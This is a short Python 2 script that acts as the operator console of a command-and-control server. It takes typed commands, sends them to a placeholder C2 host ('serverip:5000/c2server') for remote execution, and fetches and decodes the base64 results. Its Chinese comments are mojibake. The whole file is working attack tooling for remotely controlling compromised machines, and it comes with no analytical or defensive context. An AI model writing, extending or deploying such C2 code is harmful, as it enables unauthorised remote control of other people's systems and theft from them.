#! /usr/bin/env python
# coding=utf-8
import requests
import time
import os
import re
import threading
import base64


#serverip����c2������ip

def send(c2cmd):
	url="http://serverip:5000/c2server?cmd="+c2cmd
	#print url
	# ��������
	i=1
	try:
		while i<20:
			i=i+1
			s1= requests.get(url, timeout=10)
			#print s1.status_code
			if s1.status_code == 200:
				com= s1.content
				#print command
				if com == 'ok':
					return
			time.sleep(1)
	except:
		return None


def receive():
	url="http://serverip:5000/c2server?results=test"
	#data = {"text": "base64.b64encode(str(r1))"}
	#print url
	# ����ִ�н����Ļ��Է���
	i=1
	try:
		while i<10:
			i=i+1
			s1= requests.get(url,timeout=30)
			if s1.status_code == 200:
				results= s1.content
				print base64.b64decode(results)
				return
			time.sleep(1)
	except:
		return None






if __name__ == '__main__':
	c2_command = ''
	while True:
		c2_command = raw_input("Command:")
		send(c2_command)
		receive()

